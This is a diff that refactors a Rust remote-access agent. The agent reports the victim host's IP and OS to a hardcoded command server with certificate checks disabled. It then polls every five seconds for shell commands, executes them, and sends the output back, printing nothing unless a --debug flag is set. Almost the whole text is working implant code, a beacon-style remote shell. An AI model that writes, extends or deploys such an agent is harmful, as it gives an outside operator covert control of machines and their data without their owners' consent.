@@ -13,23 +13,24 @@ use dirs;
 use local_ip_address::local_ip;
 
 
-const sleep_time: Duration = time::Duration::from_millis(5000);
-const server_ip: &str = "https://129.21.49.57:443";
+const SLEEP_TIME: Duration = time::Duration::from_millis(5000);
+const SERVER_IP: &str = "https://129.21.49.57:443";
 
-fn initHost(host_ip:&str) -> Option<String>{
+fn init_host(host_ip:&str) -> Option<String>{
     let ip = host_ip;
-    let mut os = "";
-    if cfg!(windows) {
-        os = "Windows";
+    let os = if cfg!(windows) {
+        "Windows"
     } else if cfg!(unix) {
-        os = "Linux";
-    }
+        "Linux"
+    } else {
+        "Unknown"
+    };
     let text = format!("{{\"IP\": \"{}\", \"OS\": \"{}\"}}",ip,os);
     let client = reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
         .build()
         .unwrap();
-    let url = format!("{}/hosts/newHost",server_ip);
+    let url = format!("{}/hosts/newHost",SERVER_IP);
     let hostname = match client.post(url).json(&text).send(){
         Ok(ok)=>{
             let id = ok.text().unwrap().to_string(); 
@@ -41,28 +42,22 @@ fn initHost(host_ip:&str) -> Option<String>{
             None
         }
     };
-    return hostname;
+    hostname
 }
 
-fn get_local_ip() -> String {
-    let local_ip = local_ip().unwrap(); //get the local IP
-    let local_ip = format!("{}\n",local_ip); //format IP into string
-    return local_ip;
-}
-
-
-fn getCommands(identifier:&str){
-    let commands_url = format!("{}/hosts/{}/commands",server_ip,identifier);
+fn get_commands(identifier:&str){
+    let commands_url = format!("{}/hosts/{}/commands",SERVER_IP,identifier);
 	let client = reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
         .build()
         .unwrap();
+
 	let res = match client.post(commands_url).send(){
         Ok(ok)=>{
             ok.text().unwrap()
         }, Err(_)=>{
             print(&"Get_Commands - Can't connect to server");
-            thread::sleep(sleep_time);
+            thread::sleep(SLEEP_TIME);
             return
         }
     };
@@ -74,26 +69,26 @@ fn getCommands(identifier:&str){
             ok
         }, Err(_)=>{
             print(&"Get_Commands - Can't parse JSON");
-            thread::sleep(sleep_time);
+            thread::sleep(SLEEP_TIME);
             return
         }
     }; //always will receive json
 
     let command_count: i32 = format!("{}",res["command_count"]).parse().unwrap();
     if command_count == 69420{ //special number sent by server indicating there is an error
-        main_loop(&get_id(&get_local_ip()));
+        main_loop(&get_id(&(local_ip().unwrap().to_string()))).expect("Error in main loop");
     }
-    let mut count = 1;
+
     if command_count == 0{
-        print("no commands, sleeping");
+        print("No commands, sleeping");
         return
     }
-    while count <= command_count{
+
+    for count in 1..=command_count{
         let cmd_id = format!("{}",res[format!("{}",count)]["cmd_id"]);
         let command = format!("{}",res[format!("{}",count)]["command"]);
         print("Command Received:");
         print(&format!("\tCommand ID: {}\n\tCommand: {}",&cmd_id, &command));
-        count+=1;
         handle_command(&cmd_id, &command, &identifier);
     }
 }
@@ -110,10 +105,10 @@ fn handle_command(cmd_id:&str, command:&str, identifier: &str){
             let path = Path::new(&command[3..]); //the path is the remaining
             if &command[3..] == "~"{
                 let home = dirs::home_dir().unwrap();
-                set_current_dir(home);
+                set_current_dir(home).expect("Could not change directory");
             }
             else{
-                set_current_dir(path);
+                set_current_dir(path).expect("Could not change directory");
             }
             let cmd_out = &run_command(&"pwd");
             post_response(&cmd_id, &cmd_out, &identifier);
@@ -134,11 +129,11 @@ fn run_command(cmd: &str) -> String {
                 out
             }
             Err(e)=>{
-                return format!("");
+                return format!("{}",e);
             }
         };
         let three_sec = Duration::from_secs(3);
-        let status_code = match child.wait_timeout(three_sec).unwrap() {
+        match child.wait_timeout(three_sec).unwrap() {
             Some(status) => status.code(),
             None => {
                 match child.kill(){
@@ -160,17 +155,17 @@ fn run_command(cmd: &str) -> String {
     let mut stdout = child.stdout.unwrap();
     let mut stderr_str = String::new();
     let mut stderr = child.stderr.unwrap();
-    stdout.read_to_string(&mut stdout_str);
-    stderr.read_to_string(&mut stderr_str);
+    stdout.read_to_string(&mut stdout_str).unwrap();
+    stderr.read_to_string(&mut stderr_str).unwrap();
     let cmd_out = format!("{}{}",stderr_str,stdout_str);
     if cmd_out.ends_with('\n') { return cmd_out[0..cmd_out.len() - 1].to_string() }
     return cmd_out;
 }
 
 fn post_response(cmd_id: &str, response: &str, identifier: &str){
-    let responses_url = format!("{}/hosts/{}/response",server_ip, identifier);
+    let responses_url = format!("{}/hosts/{}/response",SERVER_IP, identifier);
     let mut response = response;
-    if (response.eq("")){
+    if response.eq("") {
         response = "Command executed. (No response)"
     }
     print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
@@ -179,7 +174,7 @@ fn post_response(cmd_id: &str, response: &str, identifier: &str){
         .danger_accept_invalid_certs(true)
         .build()
         .unwrap();
-    let res = match client.post(&responses_url).json(&text).send(){
+    match client.post(&responses_url).json(&text).send(){
         Ok(ok)=>{
             ok.text().unwrap()
         }, Err(_)=>{
@@ -192,7 +187,7 @@ fn post_response(cmd_id: &str, response: &str, identifier: &str){
 
 fn print(txt:&str){
     let mut print_bool: bool = false;
-    if(std::env::args().any(|x| x == "--debug")){
+    if std::env::args().any(|x| x == "--debug"){
         print_bool = true;
     }
     if print_bool{
@@ -202,12 +197,12 @@ fn print(txt:&str){
 
 fn get_id(host_ip:&str) -> String {
     loop{
-        let identifier = match initHost(host_ip){
+        let identifier = match init_host(host_ip){
             Some(id)=>{
                 id
             }, None=>{
                 print(&"Get_id - Can't connect to server");
-                thread::sleep(sleep_time);
+                thread::sleep(SLEEP_TIME);
                 continue;
             }
         };
@@ -217,13 +212,13 @@ fn get_id(host_ip:&str) -> String {
 
 fn main_loop(identifier:&str) -> Result<String,String>{
     loop{
-        getCommands(&identifier);
-        thread::sleep(sleep_time);
+        get_commands(&identifier);
+        thread::sleep(SLEEP_TIME);
     }
 }
 
 fn main(){
-    let host_ip = get_local_ip();
+    let host_ip = local_ip().unwrap().to_string();
     loop{
         let identifier = get_id(&host_ip);
         match main_loop(&identifier){
